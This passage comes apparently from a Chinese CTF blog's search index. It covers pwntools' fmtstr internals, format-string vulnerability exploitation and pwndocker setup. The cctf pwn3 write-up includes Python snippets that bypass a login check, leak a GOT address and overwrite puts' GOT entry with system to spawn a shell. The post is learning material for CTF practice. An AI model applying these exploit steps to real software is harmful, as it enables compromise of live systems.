          \"Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n\"\n            \"Truncating the data at 4 bytes.  Specify cyclic_find(..., n=%i) to override this.\",\n            n, subseq, len(subseq), len(subseq))\n        subseq = subseq[:n]\n\n    if alphabet is None:\n        alphabet = context.cyclic_alphabet\n    alphabet = packing._need_bytes(alphabet, 2, 0x80)\n\n    if any(c not in alphabet for c in subseq):\n        return -1\n\n    n = n or len(subseq)\n\n    return _gen_find(subseq, de_bruijn(alphabet, n))\n</code></pre>\n<p>​    之前一直对<code>cyclic</code>的实现抱有兴趣，抽个时间可以看看源码分析。</p>\n<p>​    </p>\n<p>​        </p>\n<h3 id=\"4）总结\">4）总结<a class=\"post-anchor\" href=\"#4）总结\"></a></h3><p>​    part1和part2主要涉及汇编对函数调用栈知识，如果对栈溢出熟悉的话其实理解起来真的非常轻松，也没有什么好说的。</p>\n<p>​    主要的困难集中在part3，也就是对fmtstr功能实现的分析，我从来没有系统地学习过面向对象的编程语言，只会写一写前端的js和简单的py脚本，对于类，对象以及函数，数据类型啥的关系都傻傻搞不清楚，这给我分析源码造成很大的困难。不过好在足够简单，也有时间去分析。以后还是需要搞清楚面向对象程序开发的一些基础知识，在各种方面都是挺有用的，尤其是自动化的一些脚本开发上。</p>\n<p>​    通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。</p>\n<p>​    然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？</p>\n<h3 id=\"5）参考\">5）参考<a class=\"post-anchor\" href=\"#5）参考\"></a></h3><p>​    <a href=\"https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr\"><code>pwnlib.fmtstr</code>— Format string bug exploitation tools</a> </p>\n<p>​    <a href=\"https://blog.csdn.net/weixin_43092232/article/details/105647076\">格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测</a></p>\n<p>​    <a href=\"https://blog.csdn.net/qq_33976344/article/details/113503914\">pwntools中fmtstr的使用</a></p>\n<p>​    <a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\">3.1.1 格式化字符串漏洞</a></p>\n<p>​    <a href=\"https://blog.csdn.net/CLHugh/article/details/75000104\">Python中self用法详解</a></p>\n</body></html>","tags":["format"]},{"title":"格式化字符串漏洞学习","url":"/2021/10/23/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","content":"<html><head></head><body><h2 id=\"1）前言\">1）前言<a class=\"post-anchor\" href=\"#1）前言\"></a></h2><p>绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。</p>\n<p>首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。</p>\n<p>所以碰到这道题，算是又给我敲了第nn个警钟。</p>\n<p>非常清晰地告诉我：我是垃圾。</p>\n<h2 id=\"2）格式化字符串基本原理\">2）格式化字符串基本原理<a class=\"post-anchor\" href=\"#2）格式化字符串基本原理\"></a></h2><p>ctfwiki上的格式化字符串教程写得挺好的，可以参考。</p>\n<h5 id=\"格式化字符串参数\">格式化字符串参数<a class=\"post-anchor\" href=\"#格式化字符串参数\"></a></h5><pre><code class=\"c\">%[parameter][flags][field width][.precision][length]type\n</code></pre>\n<ul>\n<li><p>parameter</p>\n<ul>\n<li>n$，获取格式化字符串中的指定参数</li>\n</ul>\n</li>\n<li><p>flag</p>\n</li>\n<li><p>field width</p>\n<ul>\n<li>输出的最小宽度</li>\n</ul>\n</li>\n<li><p>precision</p>\n<ul>\n<li>输出的最大长度</li>\n</ul>\n</li>\n<li><p>length，输出的长度</p>\n<ul>\n<li>hh，输出一个字节</li>\n<li>h，输出一个双字节</li>\n</ul>\n</li>\n<li><p>type</p>\n<ul>\n<li>d/i，有符号整数</li>\n<li>u，无符号整数</li>\n<li>x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li>\n<li>s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。</li>\n<li>c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。</li>\n<li><strong>p， void * 型，输出对应变量的值</strong>。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。</li>\n<li>n，不输出字符，<strong>但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</strong>。</li>\n</ul>\n<h5 id=\"格式化字符串漏洞利用\">格式化字符串漏洞利用<a class=\"post-anchor\" href=\"#格式化字符串漏洞利用\"></a></h5><p>一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。</p>\n<p>一般来说不正确的方式有这几种</p>\n<ol>\n<li>一直%s，容易引用不合法的地址，造成程序崩溃   </li>\n<li>通过打印的相关内存信息，泄露内存布局，获得有用的信息</li>\n</ol>\n<h2 id=\"3-例1-goodluck\">3)例1:goodluck<a class=\"post-anchor\" href=\"#3-例1-goodluck\"></a></h2><p>话不多说，直接上例子。</p>\n<h3 id=\"程序逻辑分析\">程序逻辑分析<a class=\"post-anchor\" href=\"#程序逻辑分析\"></a></h3><p>第一步，清晰而准确的逆向是漏洞点利用的基础。</p>\n<p>首先，程序读取flag，通过<code>_IO_getc(fp)</code>，一个字符一个字符地将flag读入v10。</p>\n<p>然后将flag的首地址给v9。</p>\n<p>然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（</p>\n<p>然后看一个关于fflush的详解</p>\n<p><a href=\"http://c.biancheng.net/cpp/html/2506.html\">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>\n<p>但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。</p>\n<p>bss段存储未初始化的全局变量，也不是缓冲区吧。</p>\n<h4 id=\"缓冲区\">缓冲区<a class=\"post-anchor\" href=\"#缓冲区\"></a></h4><p><em>从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。</em></p>\n<p>为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，<code>cingetchar</code>函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。</p>\n<h5 id=\"缓冲区的分类\">缓冲区的分类<a class=\"post-anchor\" href=\"#缓冲区的分类\"></a></h5><h6 id=\"1-全缓冲。\">1:全缓冲。<a class=\"post-anchor\" href=\"#1-全缓冲。\"></a></h6><p>只有在缓冲区被填满之后才会进行<code>I/O</code>操作；最典型的全缓冲就是对磁盘文件的读写。</p>\n<h6 id=\"2-行缓冲\">2:行缓冲<a class=\"post-anchor\" href=\"#2-行缓冲\"></a></h6><p>只有在输入或者是输出中遇到换行符的时候才会进行<code>I/O</code>操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做<code>I/O</code>操作。一般来说，标准输入流(<code>stdin</code>)和标准输出流(<code>stdout</code>)是行缓冲</p>\n<h6 id=\"3-无缓冲\">3:无缓冲<a class=\"post-anchor\" href=\"#3-无缓冲\"></a></h6><ol>\n<li>无缓冲；标准<code>I/O</code>不缓存字符；其中表现最明显的就是标准错误输出流(<code>stderr</code>)，这使得出错信息尽快的返回给用户。</li>\n</ol>\n<p>（我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错）</p>\n<h5 id=\"fflush函数\">fflush函数<a class=\"post-anchor\" href=\"#fflush函数\"></a></h5><p>然后是关于fflush函数的glibc源码。</p>\n<p>fflush实际是调用vtable中的函数<code>_IO_new_file_sync</code>，这个函数的源码如图：</p>\n<p>（<code>/glibc-2.23/libio/fileops.c:867</code>）</p>\n<pre><code class=\"c\">int\n_IO_new_file_sync (_IO_FILE *fp)\n{\n  _IO_ssize_t delta;\n  int retval = 0;\n\n  /*    char* ptr = cur_ptr(); */\n  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n    if (_IO_do_flush(fp)) \n    return EOF;//end of file\n  delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end;\n  if (delta != 0)\n    {\n#ifdef TODO\n      if (_IO_in_backup (fp))\n    delta -= eGptr () - Gbase ();\n#endif\n      _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1);\n      if (new_pos != (_IO_off64_t) EOF)\n    fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;\n#ifdef ESPIPE\n      else if (errno == ESPIPE)\n    ; /* Ignore error from unseekable devices. */\n#endif\n      else\n    retval = EOF;\n    }\n  if (retval != EOF)\n    fp-&gt;_offset = _IO_pos_BAD;\n  /* FIXME: Cleanup - can this be shared? */\n  /*    setg(base(), ptr, ptr); */\n  return retval;\n}\nlibc_hidden_ver (_IO_new_file_sync, _IO_file_sync)\n</code></pre>\n<p>虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。</p>\n<h5 id=\"pwntools与缓冲区机制\">pwntools与缓冲区机制<a class=\"post-anchor\" href=\"#pwntools与缓冲区机制\"></a></h5><p>某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。</p>\n<p>为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E4%BA%94%E5%A4%A9--pwntools%E6%BA%90%20%E7%A0%81%20%E5%89%96%20%E6%9E%90--%E4%BB%A5%E6%BA%90%E7%A0%81%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90io%E4%BA%A4%E4%BA%92%E5%8E%9F%E7%90%86/\">pwntools源码剖析（1）–以源码的角度分析io交互原理</a></p>\n<h4 id=\"ms？\">%ms？<a class=\"post-anchor\" href=\"#ms？\"></a></h4><p>从缓冲区的研究回到程序的简单逻辑分析上。</p>\n<p><code>__isoc99_scanf(\"%ms\", &amp;format);</code></p>\n<p>接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里）</p>\n<p>然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。</p>\n<h3 id=\"漏洞利用\">漏洞利用<a class=\"post-anchor\" href=\"#漏洞利用\"></a></h3><p>因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。</p>\n<p>那么如何打印这个flag呢？</p>\n<p>我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png\" data-caption=\"截屏2021-10-26 下午10.31.45\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.31.45.png\" alt=\"截屏2021-10-26 下午10.31.45\"></a></p>\n<p>flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。</p>\n<p>这时候就需要计算这个flag字符串与栈顶的偏移。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png\" data-caption=\"截屏2021-10-26 下午10.35.39\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-26%20%E4%B8%8B%E5%8D%8810.35.39.png\" alt=\"截屏2021-10-26 下午10.35.39\"></a></p>\n<p>显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。</p>\n<p>利用%n$s打印参数，即可获得flag。</p>\n<h2 id=\"4-例2\">4)例2<a class=\"post-anchor\" href=\"#4-例2\"></a></h2><p>经过刚才的开胃菜，我们总算进入了正题。</p>\n<p>一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。</p>\n<p>但是如果需要修改函数的got表，我们需要满足几个条件：</p>\n<ol>\n<li>知道需要修改的函数的真实地址。</li>\n<li>需要想办法改写函数的got表。</li>\n</ol>\n<p>一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（</p>\n<p>回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子</p>\n<h3 id=\"cctf-pwn3\">cctf pwn3<a class=\"post-anchor\" href=\"#cctf-pwn3\"></a></h3><h5 id=\"程序分析\">程序分析<a class=\"post-anchor\" href=\"#程序分析\"></a></h5><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png\" data-caption=\"截屏2021-10-27 上午8.50.03\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%888.50.03.png\" alt=\"截屏2021-10-27 上午8.50.03\"></a></p>\n<h5 id=\"程序逻辑分析-1\">程序逻辑分析<a class=\"post-anchor\" href=\"#程序逻辑分析-1\"></a></h5><p>还是先进行一个简单的逻辑分析。</p>\n<p>首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png\" data-caption=\"截屏2021-10-27 上午9.02.34\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%889.02.34.png\" alt=\"截屏2021-10-27 上午9.02.34\"></a></p>\n<p>所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。</p>\n<p>当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址。</p>\n<p>首先我们确定字符串偏移。</p>\n<h5 id=\"gdb动调的一些坑\">gdb动调的一些坑<a class=\"post-anchor\" href=\"#gdb动调的一些坑\"></a></h5><p>用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成<code> ERROR: Could not find ELF base!</code></p>\n<p>原因详见<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%9B%9B%E5%A4%A9--gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/\">摆烂第四天–gdb附加调试的一些黑魔法</a>的2.1节。</p>\n<p>因为一下断点，程序就异常退出，所以这道题又非常不幸地沦为了看，而不是调。</p>\n<p>等问题解决了在再来调。</p>\n<pre><code class=\"python\">tmp = 'sysbdmin'\nname = \"\"\nfor i in tmp:\n    name += chr(ord(i) - 1)\n\n\n## password\ndef password():\n    sh.recvuntil('Name (ftp.hacker.server:Rainism):')\n    sh.sendline(name)\n</code></pre>\n<p>绕过密码的关键函数。其实绕过的核心思路就是strcmp的返回值，strcmp是以asc2码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的asc2小，但字符长度相等的字符。</p>\n<p>这样就有了代码中的公式。</p>\n<p>当我们绕过了密码，然后就需要打印puts函数的真实地址。</p>\n<p>打印真实地址，第一步需要找到格式化字符串在栈中的偏移。</p>\n<p>关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。</p>\n<p>原理参见：<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/\">格式化字符串偏移计算原理</a></p>\n<p>这里的偏移是8</p>\n<pre><code class=\"python\"># get the addr of puts\nputs_got = pwn3.got['puts']\nlog.success('puts got : ' + hex(puts_got))\nput(b'1111', b'%8$s' + p32(puts_got))\nputs_addr = u32(get('1111')[:4])\n</code></pre>\n<p>然后put一个名为1111的文件，内容是格式化字符串以及puts的got表地址。</p>\n<p>这里<code>%8$s' + p32(puts_got)</code>应该是先把puts的got表传进去，然后再通过%8$s打印。</p>\n<p>然后接收信息，就是puts的got表。</p>\n<p>然后就是经典rop的确定libc基址和system地址，比较套路。</p>\n<p>下一个关键点是</p>\n<pre><code class=\"python\">payload = fmtstr_payload(7, {puts_got: system_addr})\nput('/bin/sh;', payload)\nsh.recvuntil('ftp&gt;')\nsh.sendline('get')\nsh.recvuntil('enter the file name you want to get:')\n##gdb.attach(sh)\nsh.sendline('/bin/sh;') \n</code></pre>\n<p>​    这里其实主要的问题都是被<code>fmtstr_payload</code>函数解决了。</p>\n<p>​    这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。</p>\n<p>​    关于函数是如何实现的，可以参见另外一篇笔记。<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/\">格式化字符串偏移计算原理</a></p>\n<p>最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。</p>\n<p>​    </p>\n<p>​    这个题的调试部分才是大头，一点一点把问题解决吧。</p>\n<h4 id=\"调试部分\">调试部分<a class=\"post-anchor\" href=\"#调试部分\"></a></h4><p>​    思路和exp都很清楚的情况下，我们尝试对题目进行调试。</p>\n<h2 id=\"参考\">参考<a class=\"post-anchor\" href=\"#参考\"></a></h2><p><a href=\"https://zhuanlan.zhihu.com/p/79504011\">缓冲区机制详解</a></p>\n<p><a href=\"http://c.biancheng.net/cpp/html/2506.html\">C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区）</a></p>\n<p><a href=\"https://stackoverflow.com/questions/38685724/difference-between-ms-and-s-scanf\">difference between %ms and %s scanf</a></p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-example/\">格式化字符串</a></p>\n<p>[格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测)</p>\n</li>\n</ul>\n</body></html>","tags":["format"]},{"title":"pwndocker的pwn题体验（下","url":"/2021/11/11/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","content":"<html><head></head><body><h3 id=\"0）\">0）<a class=\"post-anchor\" href=\"#0）\"></a></h3><p>​        哈哈，还是连续剧，我也想不到捏。我也不想捏。</p>\n<h3 id=\"1）问题\">1）问题<a class=\"post-anchor\" href=\"#1）问题\"></a></h3><p>​        pwndocker体验了快一周，目前来说主要问题有这几个：</p>\n<ol>\n<li><p>启动tmux进行调试时机器发热严重，风扇狂转</p>\n</li>\n<li><p>挂载文件夹内文件不同步</p>\n</li>\n<li><p>快照的制作相对麻烦（时间久，步骤多）</p>\n</li>\n<li><p>打开需要输入命令，有点烦。</p>\n<p>​    想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。</p>\n<p>（看我的绝美终端）</p>\n</li>\n</ol>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%884.09.52.png\" data-caption=\"截屏2021-11-11 上午4.09.52\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%884.09.52.png\" alt=\"截屏2021-11-11 上午4.09.52\"></a></p>\n<p>​        每天在ayanami的注视下打工也会变得快乐（不是打工）</p>\n<p>​        虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。</p>\n<p>​        目前来说我只能应付。</p>\n<h3 id=\"3）解决方案？\">3）解决方案？<a class=\"post-anchor\" href=\"#3）解决方案？\"></a></h3><h4 id=\"1\">1<a class=\"post-anchor\" href=\"#1\"></a></h4><p>​        机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。</p>\n<p>​        2021-11-14更新：这个问题突然就没有了（</p>\n<h4 id=\"2\">2<a class=\"post-anchor\" href=\"#2\"></a></h4><p>​        挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。</p>\n<p>​        2021-11-14更新：这个问题突然就没有了（</p>\n<h4 id=\"3\">3<a class=\"post-anchor\" href=\"#3\"></a></h4><p>​        这个可以整个一件push脚本</p>\n<p>ps：可以直接<code>docker commit -p</code> ，也算生成了快照，并且耗时比较短，就是有一点点没有安全感。</p>\n<h4 id=\"4\">4<a class=\"post-anchor\" href=\"#4\"></a></h4><p>​        直接写shell脚本，然后放在默认路径下。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8B%E5%8D%889.09.46.png\" data-caption=\"截屏2021-11-11 下午9.09.46\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8B%E5%8D%889.09.46.png\" alt=\"截屏2021-11-11 下午9.09.46\"></a></p>\n<h4 id=\"5\">5<a class=\"post-anchor\" href=\"#5\"></a></h4><pre><code class=\"bash\">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so\npatchelf --set-interpreter /tmp/ld-2.27.so ./test\nLD_PRELOAD=./libc.so.6 ./test\n</code></pre>\n<p>好东西</p>\n</body></html>","tags":["mess"]},{"title":"pwndocker的pwn题体验（上）","url":"/2021/11/02/pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8A%EF%BC%89/","content":"<html><head></head><body><h3 id=\"1）前言\">1）前言<a class=\"post-anchor\" href=\"#1）前言\"></a></h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>\n<h3 id=\"2）pwndocker启动\">2）pwndocker启动<a class=\"post-anchor\" href=\"#2）pwndocker启动\"></a></h3><p>​        首先是如何build pwndocker的问题。</p>\n<p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>\n<p>​        这里参考一篇博客的做法：<a href=\"https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80\">skysider/pwndocker 正确使用姿势</a>。</p>\n<p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>\n<p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>\n<p>​        然后可以</p>\n<pre><code class=\"bash\">    docker run -d \\\n    --rm \\\n    -h ${ctf_name} \\\n    --name ${ctf_name} \\\n    -v $(pwd)/${ctf_name}:/ctf/work \\\n    -p 23947:23947 \\\n    --cap-add=SYS_PTRACE \\\n    --privileged \\\n    pwn6\n</code></pre>\n<p>​        运行镜像。</p>\n<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png\" data-caption=\"截屏2021-11-03 下午5.00.25\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png\" alt=\"截屏2021-11-03 下午5.00.25\"></a></p>\n<p>​    </p>\n<p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png\" data-caption=\"截屏2021-11-03 下午10.05.57\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.05.57.png\" alt=\"截屏2021-11-03 下午10.05.57\"></a></p>\n<p>​    </p>\n<p>​        关于<code>docker cp</code>指令这里，因为不太熟悉docker的基础指令，掉到坑中绕了一会儿。</p>\n<p>​        如果我们需要将我们的二进制文件cp到容器中，需要指定容器的pid，但是如果是通过<code>docker run</code>指令并加上参数进入容器内的话，每次执行这个指令，就相当于通过镜像重新创建了一个容器，pid就会变化，所以这样操作肯定行不通。所以我们先创建一个容器，然后copy它的pid，cp文件以后，通过<code>docker start</code>和<code>docker attach</code>来进入容器就行。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png\" data-caption=\"截屏2021-11-03 下午10.14.12\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8810.14.12.png\" alt=\"截屏2021-11-03 下午10.14.12\"></a></p>\n<p>​        愉快的gdb时间（（</p>\n<p>​        还要解决的就是容器与主机交互的问题，毕竟脚本啥还是要用图形化的写比较开心。</p>\n<p>​        然后是做题时间。</p>\n<p>​        这个题尤其基础，直接溢出0x20个字符就行，ret2shellcode。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png\" data-caption=\"截屏2021-11-03 下午11.01.29\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.01.29.png\" alt=\"截屏2021-11-03 下午11.01.29\"></a></p>\n<p>​    </p>\n<p>​        ps：关于cyclic的原理可以看我的pwntools源码解析系列。</p>\n<p>​        然后还是得解决主机和容器之间的信息交互，如何优雅地将主机写的脚本传进docker捏 。</p>\n<p>​        还是要借助<code>docker run</code>的- v参数，大概就是<code>~/work/pwner:/ctf/work</code></p>\n<p>​        但是比较离谱的就是copy了文件夹以后，似乎并不能立即在容器中看到，我重启之后才有效果。难道每次修改脚本都需要重启容器吗？</p>\n<p>​        后来重启一次之后就能立即同步到容器中了。好。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%8811.16.05.png\" data-caption=\"截屏2021-11-03 下午11.16.05\" data-fancybox=\"images\"><img 